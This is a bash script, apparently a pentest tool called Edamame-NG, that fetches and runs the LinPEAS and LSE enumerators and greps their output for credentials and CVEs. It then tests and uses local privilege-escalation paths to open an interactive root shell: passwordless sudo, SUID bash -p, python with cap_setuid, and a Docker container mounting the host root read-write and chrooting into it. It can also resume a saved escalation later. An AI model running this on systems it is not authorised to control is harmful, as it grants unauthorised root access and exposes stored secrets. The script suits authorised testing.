#!/usr/bin/env bash
# Edamame-NG: host-local Linux enumeration and verified privilege proof.
set -uo pipefail
umask 077

if [[ $(uname -s) != Linux ]]; then
  printf 'Edamame-NG Linux runner requires Linux.\n' >&2
  exit 2
fi

RUN_BASE="${HOME}/edamame-ng-runs"
CACHE_BASE="${XDG_CACHE_HOME:-${HOME}/.cache}/edamame-ng"
TOOL_DIR=''
MODE='auto'
RESUME_ID=''
NO_SHELL=0

usage() {
  cat <<'EOF'
Usage: edamame-ng.sh [--scan | --resume [RUN_ID]] [--output-dir DIR]
                      [--tool-dir DIR] [--no-shell]
Run with no mode to choose Resume (default) or Scan when a prior success exists.
--tool-dir accepts local assets only when each has an adjacent .sha256 file.
EOF
}

while (($#)); do
  case $1 in
    --scan) MODE=scan; shift ;;
    --resume) MODE=resume; shift; if (($#)) && [[ $1 != --* ]]; then RESUME_ID=$1; shift; fi ;;
    --output-dir) (($# >= 2)) || { usage >&2; exit 2; }; RUN_BASE=$2; shift 2 ;;
    --tool-dir) (($# >= 2)) || { usage >&2; exit 2; }; TOOL_DIR=$2; shift 2 ;;
    --no-shell) NO_SHELL=1; shift ;;
    -h|--help) usage; exit 0 ;;
    *) usage >&2; exit 2 ;;
  esac
done

sha256_file() {
  if command -v sha256sum >/dev/null 2>&1; then
    sha256sum "$1" | awk '{print $1}'
  else
    shasum -a 256 "$1" | awk '{print $1}'
  fi
}

safe_name() { [[ $1 =~ ^[A-Za-z0-9._+-]+$ ]]; }
host_name=$(hostname -s 2>/dev/null || hostname)
host_name=${host_name//[^A-Za-z0-9._-]/_}

latest_success() {
  [[ -d $RUN_BASE ]] || return 1
  find "$RUN_BASE" -mindepth 2 -maxdepth 2 -name success.tsv -type f -print 2>/dev/null |
    sort -r | while IFS= read -r candidate; do
      IFS=$'\t' read -r candidate_host _ < "$candidate"
      if [[ $candidate_host == "$host_name" ]]; then
        printf '%s\n' "$candidate"
        break
      fi
    done
}

if [[ $MODE == auto ]]; then
  prior=$(latest_success || true)
  if [[ -n $prior ]]; then
    if [[ -t 0 ]]; then
      read -r -p "Prior success found. [R]esume (default) or [S]can? " choice
      [[ $choice == [sS]* ]] && MODE=scan || MODE=resume
    else
      MODE=resume
    fi
  else
    MODE=scan
  fi
fi

success_file=''
if [[ $MODE == resume ]]; then
  if [[ -n $RESUME_ID ]]; then
    safe_name "$RESUME_ID" || { printf 'Invalid run ID.\n' >&2; exit 2; }
    success_file="$RUN_BASE/$RESUME_ID/success.tsv"
  else
    success_file=$(latest_success || true)
  fi
  [[ -n $success_file && -f $success_file && ! -L $success_file ]] || {
    printf 'No valid successful run to resume.\n' >&2; exit 2;
  }
  IFS=$'\t' read -r saved_host recipe _ < "$success_file"
  [[ $saved_host == "$host_name" ]] || { printf 'Saved run belongs to another host.\n' >&2; exit 2; }
  case $recipe in
    already-root|sudo-shell|suid-bash|python-cap-setuid|docker-host-root) ;;
    *) printf 'Unknown saved recipe.\n' >&2; exit 2 ;;
  esac
  printf '[RESUME] %s on %s; checking prerequisites again.\n' "$recipe" "$host_name"
  RUN_DIR=${success_file%/success.tsv}
else
  mkdir -p "$RUN_BASE" "$CACHE_BASE"
  chmod 700 "$RUN_BASE" "$CACHE_BASE"
  run_id="$(date -u +%Y%m%dT%H%M%SZ)-${host_name}-$$"
  RUN_DIR="$RUN_BASE/$run_id"
  mkdir -m 700 "$RUN_DIR" "$RUN_DIR/.capture"
  : > "$RUN_DIR/tools.tsv"
  : > "$RUN_DIR/findings.tsv"
  : > "$RUN_DIR/attempts.tsv"
  : > "$RUN_DIR/coverage.tsv"
  printf '[RUN] %s\n' "$RUN_DIR"
fi

record_attempt() {
  printf '%s\t%s\t%s\n' "$(date -u +%Y-%m-%dT%H:%M:%SZ)" "$1" "$2" >> "$RUN_DIR/attempts.tsv"
}

record_finding() {
  local category=$1 detail=$2
  printf '%s\t%s\n' "$category" "$detail" >> "$RUN_DIR/findings.tsv"
  printf '[FOUND] %s: %s\n' "$category" "$detail"
}

asset_from_release() {
  local repo=$1 asset=$2 dest=$3 tag expected url html actual cache_dir cached
  cache_dir="$CACHE_BASE/${repo//\//_}"
  mkdir -p "$cache_dir"
  chmod 700 "$cache_dir"
  cached="$cache_dir/$asset"
  if [[ -n $TOOL_DIR ]]; then
    if [[ -f $TOOL_DIR/$asset && -f $TOOL_DIR/$asset.sha256 ]]; then
      expected=$(awk 'NR==1 {print $1}' "$TOOL_DIR/$asset.sha256" | tr '[:upper:]' '[:lower:]')
      actual=$(sha256_file "$TOOL_DIR/$asset")
      if [[ $expected =~ ^[a-f0-9]{64}$ && $actual == "$expected" ]]; then
        cp "$TOOL_DIR/$asset" "$dest"
        printf '%s\tlocal\t%s\t%s\n' "$asset" "$TOOL_DIR/$asset" "$actual" >> "$RUN_DIR/tools.tsv"
        return 0
      fi
    fi
    printf '[WARN] Local %s is missing or its checksum failed.\n' "$asset" >&2
  else
    url=$(curl -fsSLI --connect-timeout 5 --max-time 20 -o /dev/null -w '%{url_effective}' "https://github.com/$repo/releases/latest" 2>/dev/null || true)
    tag=${url##*/}
    if safe_name "$tag" && [[ $url == "https://github.com/$repo/releases/tag/"* ]]; then
      html="$RUN_DIR/.capture/${asset}.release.html"
      if curl -fsSL --connect-timeout 5 --max-time 25 "https://github.com/$repo/releases/expanded_assets/$tag" -o "$html" 2>/dev/null; then
        expected=$(awk -v n="$asset" 'index($0,"digest for " n "\"") {if (match($0,/sha256:[a-f0-9]{64}/)) {print substr($0,RSTART+7,64); exit}}' "$html")
        if [[ -z $expected && $repo == diego-treitos/linux-smart-enumeration && $asset == lse.sh ]]; then
          url="https://github.com/$repo/releases/download/$tag/$asset"
          if curl -fsSL --retry 2 --connect-timeout 5 --max-time 180 "$url" -o "$dest" 2>/dev/null; then
            actual=$(sha256_file "$dest")
            cp "$dest" "$cached"
            printf '%s\n' "$actual" > "$cached.sha256"
            printf '%s\t%s\t%s\t%s\t%s\n' "$asset" "$tag" "$url" "$actual" legacy-release-no-published-digest >> "$RUN_DIR/tools.tsv"
            printf '[WARN] %s release publishes no SHA-256; recorded download digest for cache checks.\n' "$asset" >&2
            return 0
          fi
        fi
        if [[ $expected =~ ^[a-f0-9]{64}$ ]]; then
          url="https://github.com/$repo/releases/download/$tag/$asset"
          if curl -fsSL --retry 2 --connect-timeout 5 --max-time 180 "$url" -o "$dest" 2>/dev/null; then
            actual=$(sha256_file "$dest")
            if [[ $actual == "$expected" ]]; then
              cp "$dest" "$cached"
              printf '%s\n' "$expected" > "$cached.sha256"
              printf '%s\t%s\t%s\t%s\n' "$asset" "$tag" "$url" "$actual" >> "$RUN_DIR/tools.tsv"
              return 0
            fi
            rm -f "$dest"
            printf '[WARN] %s digest mismatch.\n' "$asset" >&2
          fi
        fi
      fi
    fi
    printf '[WARN] Current %s unavailable; checking verified cache.\n' "$asset" >&2
  fi
  if [[ -f $cached && -f $cached.sha256 ]]; then
    expected=$(awk 'NR==1 {print $1}' "$cached.sha256" | tr '[:upper:]' '[:lower:]')
    actual=$(sha256_file "$cached")
    if [[ $expected =~ ^[a-f0-9]{64}$ && $actual == "$expected" ]]; then
      cp "$cached" "$dest"
      printf '%s\tcache\t%s\t%s\n' "$asset" "$cached" "$actual" >> "$RUN_DIR/tools.tsv"
      return 0
    fi
  fi
  printf '%s\tmissing\t-\t-\n' "$asset" >> "$RUN_DIR/tools.tsv"
  return 1
}

verify_recipe() {
  local recipe=$1 py caps image
  case $recipe in
    already-root) [[ $(id -u) == 0 ]] ;;
    sudo-shell) command -v sudo >/dev/null 2>&1 && sudo -n /bin/bash -i -c 'test "$(id -u)" = 0' >/dev/null 2>&1 ;;
    suid-bash)
      [[ -u /bin/bash && $(stat -c %u /bin/bash 2>/dev/null) == 0 ]] &&
        /bin/bash -p -c 'test "$(id -u)" = 0' >/dev/null 2>&1
      ;;
    python-cap-setuid)
      py=$(command -v python3 || true)
      [[ -n $py ]] && command -v getcap >/dev/null 2>&1 || return 1
      caps=$(getcap "$py" 2>/dev/null)
      [[ $caps == *cap_setuid* ]] && "$py" -c 'import os; os.setuid(0); assert os.getuid()==0' >/dev/null 2>&1
      ;;
    docker-host-root)
      command -v docker >/dev/null 2>&1 || return 1
      image=$(docker image ls --format '{{.Repository}}:{{.Tag}}' 2>/dev/null | awk '$0 !~ /<none>/ {print; exit}')
      [[ -n $image ]] || return 1
      timeout 30 docker run --rm --pull never --network none --entrypoint /bin/sh -v /:/host:ro "$image" -c 'chroot /host /bin/sh -c "test \"\$(id -u)\" = 0"' >/dev/null 2>&1
      ;;
    *) return 1 ;;
  esac
}

open_shell() {
  local recipe=$1 image py
  if ((NO_SHELL)); then
    printf '[PROOF] %s verified. Shell suppressed by --no-shell.\n' "$recipe"
    return 0
  fi
  [[ -t 0 && -t 1 ]] || { printf '[WARN] Interactive TTY required for elevated shell. Resume from a terminal.\n' >&2; return 0; }
  printf '[SHELL] %s. Exit to return to Edamame-NG.\n' "$recipe"
  case $recipe in
    already-root) /bin/bash -i ;;
    sudo-shell) sudo -n /bin/bash -i ;;
    suid-bash) /bin/bash -p -i ;;
    python-cap-setuid)
      py=$(command -v python3)
      "$py" -c 'import os; os.setuid(0); os.execv("/bin/bash",["/bin/bash","-i"])'
      ;;
    docker-host-root)
      image=$(docker image ls --format '{{.Repository}}:{{.Tag}}' 2>/dev/null | awk '$0 !~ /<none>/ {print; exit}')
      docker run --rm -it --pull never --network none --entrypoint /bin/sh -v /:/host:rw "$image" -c 'chroot /host /bin/bash -i'
      ;;
  esac
}

if [[ $MODE == resume ]]; then
  if verify_recipe "$recipe"; then
    record_attempt "$recipe" resumed-proof
    open_shell "$recipe"
    exit 0
  fi
  record_attempt "$recipe" resume-prerequisite-failed
  printf '[WARN] Saved recipe no longer works. Use --scan.\n' >&2
  exit 1
fi

printf '[ENUM] Fetching official current release assets.\n'
linpeas="$RUN_DIR/.capture/linpeas.sh"
lse="$RUN_DIR/.capture/lse.sh"
have_linpeas=0; have_lse=0
asset_from_release peass-ng/PEASS-ng linpeas.sh "$linpeas" && have_linpeas=1
asset_from_release diego-treitos/linux-smart-enumeration lse.sh "$lse" && have_lse=1

if ((have_linpeas)); then
  printf '[ENUM] LinPEAS\n'
  if timeout 600 bash "$linpeas" > "$RUN_DIR/.capture/linpeas-output.txt" 2>&1; then
    printf 'linpeas\tchecked\n' >> "$RUN_DIR/coverage.tsv"
  else
    printf 'linpeas\tpartial\n' >> "$RUN_DIR/coverage.tsv"
  fi
else
  printf 'linpeas\tunavailable\n' >> "$RUN_DIR/coverage.tsv"
fi
if ((have_lse)); then
  printf '[ENUM] LSE\n'
  if timeout 600 bash "$lse" -i -l2 -c > "$RUN_DIR/.capture/lse-output.txt" 2>&1; then
    printf 'lse\tchecked\n' >> "$RUN_DIR/coverage.tsv"
  else
    printf 'lse\tpartial\n' >> "$RUN_DIR/coverage.tsv"
  fi
else
  printf 'lse\tunavailable\n' >> "$RUN_DIR/coverage.tsv"
fi

for label in linpeas lse; do
  output="$RUN_DIR/.capture/$label-output.txt"
  if [[ -f $output ]]; then
    count=$(grep -Eic 'writ(e|able)|password|credential|suid|cap_setuid|sudo|CVE-' "$output" || true)
    record_finding "$label-screening" "$count candidate lines in raw output; values withheld from console"
  fi
done

printf '[ENUM] Verifying local escalation paths.\n'
if command -v sudo >/dev/null 2>&1; then
  # shellcheck disable=SC2024 # The current user owns this capture file.
  sudo -n -l > "$RUN_DIR/.capture/sudo-list.txt" 2>&1 || true
fi
if command -v getcap >/dev/null 2>&1; then
  getcap -r /usr/bin /bin 2>/dev/null > "$RUN_DIR/.capture/capabilities.txt" || true
fi
find /usr/bin /bin -maxdepth 1 -perm -4000 -type f 2>/dev/null > "$RUN_DIR/.capture/suid-files.txt" || true

cve_tmp="$RUN_DIR/.capture/cve-candidates.txt"
for file in "$RUN_DIR/.capture/linpeas-output.txt" "$RUN_DIR/.capture/lse-output.txt"; do
  [[ -f $file ]] && grep -oE 'CVE-[0-9]{4}-[0-9]{4,}' "$file" || true
done | sort -u > "$cve_tmp"
if [[ -s $cve_tmp ]]; then
  record_finding cve-candidates "$(wc -l < "$cve_tmp" | tr -d ' ') suggested; review package/build status"
fi

selected=''
for candidate in already-root sudo-shell suid-bash python-cap-setuid docker-host-root; do
  if verify_recipe "$candidate"; then
    selected=$candidate
    record_finding local-escalation "$candidate independently verified"
    record_attempt "$candidate" proof-success
    break
  fi
  record_attempt "$candidate" prerequisite-not-met
done
enum_status=unsupported
if ((have_linpeas || have_lse)); then enum_status=checked; fi
while IFS='|' read -r area basis; do
  [[ -n $area ]] && printf '%s\t%s\t%s\n' "$area" "$enum_status" "$basis" >> "$RUN_DIR/coverage.tsv"
done <<'EOF'
Situational Awareness and Initial Enumeration|enumerator output
Check OS version, hostname, IP and distribution.|enumerator output
User and Sudoers Enumeration|enumerator output plus native sudo check
Startup scripts|enumerator output
History and backups|enumerator output
Sudoers|enumerator output plus native sudo check
Installed Applications|enumerator output
Drive Configuration|enumerator output
Service Enum|enumerator output
Docker / LXC Enum|enumerator output plus Docker proof
Running Processes|enumerator output
Network & WiFi Enumeration|local host output only
Cronjobs & Scheduled Tasks|enumerator output; no task change
Common Privilege Escalation Methods|enumerator output plus named recipes
SUID / SGID binaries|enumerator output plus native bash proof
Writable files & directories|enumerator output; no file change
Passwords & sensitive files|enumerator output; values only in protected raw files
Interesting Files|enumerator output
Docker Escape|native Docker proof when prerequisites match
Kernel & exploit checks|enumerator output; CVEs are suggestions only
Environment abuse|enumerator output
Path abuse|enumerator output
Databases|passive enumeration only; no authentication
MYSQL / MariaDB|passive enumeration only; no authentication
POSTGRESQL|passive enumeration only; no authentication
SQLite / SQLite3|passive enumeration only; no authentication
Redis (redis-cli)|passive enumeration only; no authentication
MongoDB|passive enumeration only; no authentication
Automated Privilege Escalation Tools|LinPEAS and LSE
EOF
# shellcheck disable=SC1112 # Preserve the checklist heading verbatim.
printf 'Dump clear PSK keys from the Network Manager if available.\tunsupported\tno cleartext value extraction\nCheck for tasks that are run as root and are world writeable.\tunsupported\timpactful change needs a reviewed recipe\nRev Shell’s\tinapplicable\ttool opens a local shell\nRed Teaming Toolkit\tunsupported\ttool-specific checklist entry\nBeRoot\tunsupported\ttool-specific checklist entry\n' >> "$RUN_DIR/coverage.tsv"

# The visible alerts above precede these final output filenames.
for label in linpeas lse; do
  if [[ -f $RUN_DIR/.capture/$label-output.txt ]]; then
    mv "$RUN_DIR/.capture/$label-output.txt" "$RUN_DIR/$label-output.txt"
    printf '[SAVED] %s-output.txt\n' "$label"
  fi
done
while IFS= read -r cve; do
  [[ -n $cve ]] && printf '%s\thttps://www.cve.org/CVERecord?id=%s\n' "$cve" "$cve"
done < "$cve_tmp" > "$RUN_DIR/cve-candidates.tsv"
printf '[SAVED] findings.tsv, coverage.tsv, attempts.tsv, tools.tsv\n'

if [[ -n $selected ]]; then
  printf '%s\t%s\tverified-local-proof\n' "$host_name" "$selected" > "$RUN_DIR/success.tsv"
  open_shell "$selected"
  exit 0
fi
printf '[RESULT] No supported local escalation recipe verified. See %s\n' "$RUN_DIR"
exit 0
